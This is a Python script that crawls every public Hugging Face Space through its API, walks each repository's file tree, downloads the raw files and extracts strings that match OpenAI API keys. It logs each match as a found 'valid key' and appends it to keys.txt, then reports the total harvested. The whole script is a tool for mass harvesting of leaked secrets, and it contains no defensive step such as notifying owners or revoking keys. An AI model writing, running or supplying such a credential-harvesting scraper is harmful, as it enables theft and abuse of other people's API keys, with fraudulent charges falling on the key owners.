import requests
import re
import time

def append_to_file(filename, content):
    with open(filename, 'a') as file:
        file.write(content + '\n')

oai_regex = re.compile(r"sk-[a-zA-Z0-9_-]{47,}")
keys = set()

print("Starting to gather potential keys from Hugging Face Spaces...")

offset = 0
while True:
    print(f"Fetching spaces from offset {offset}")
    try:
        response = requests.get(
            f"https://huggingface.co/api/spaces?limit=100&offset={offset}",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        if response.status_code != 200:
            break

        spaces = response.json()
        if not spaces:
            break

        for space in spaces:
            author = space.get('author')
            repo_id = space.get('id')
            if not author or not repo_id:
                continue

            print(f"Scraping space: {author}/{repo_id}")

            # Get all files in repository
            files = []
            directories = ['']
            while directories:
                current_dir = directories.pop(0)
                try:
                    dir_response = requests.get(
                        f"https://huggingface.co/api/spaces/{author}/{repo_id}/tree/main/{current_dir}",
                        timeout=10
                    )
                    if dir_response.status_code != 200:
                        continue

                    for item in dir_response.json():
                        if item['type'] == 'file':
                            files.append(item['path'])
                        elif item['type'] == 'directory':
                            directories.append(item['path'])
                    time.sleep(0.3)
                except Exception as e:
                    continue

            # Scan files for API keys
            for file_path in files:
                try:
                    content_response = requests.get(
                        f"https://huggingface.co/spaces/{author}/{repo_id}/raw/main/{file_path}",
                        timeout=10
                    )
                    if content_response.status_code == 200:
                        found_keys = oai_regex.findall(content_response.text)
                        for key in found_keys:
                            print(f"Found valid key: {key}")
                            keys.add(key)
                            append_to_file("keys.txt", key)
                    time.sleep(0.2)
                except Exception as e:
                    continue

    except Exception as e:
        print(f"Error: {str(e)}")

    offset += 100
    time.sleep(1.5)

print(f"Completed scraping. Total keys harvested: {len(keys)}")
